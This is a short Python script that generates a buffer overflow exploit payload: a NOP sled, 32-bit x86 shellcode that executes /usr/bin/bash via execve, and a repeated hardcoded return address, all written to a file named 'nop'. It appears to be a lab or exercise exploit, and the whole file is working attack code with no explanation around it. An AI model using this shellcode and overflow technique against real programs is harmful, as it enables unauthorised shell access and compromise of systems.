import sys

total = int(sys.argv[1])


payload = b"\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80"
return_adres = b"\xfc\xdb\xff\xff\xff\x7f" * 10

instructions = payload + return_adres
instructions = (b"\x90" * (total - len(instructions))) + instructions

print(len(instructions))
print(instructions)
with open("nop", "wb") as f:
    f.write(instructions)
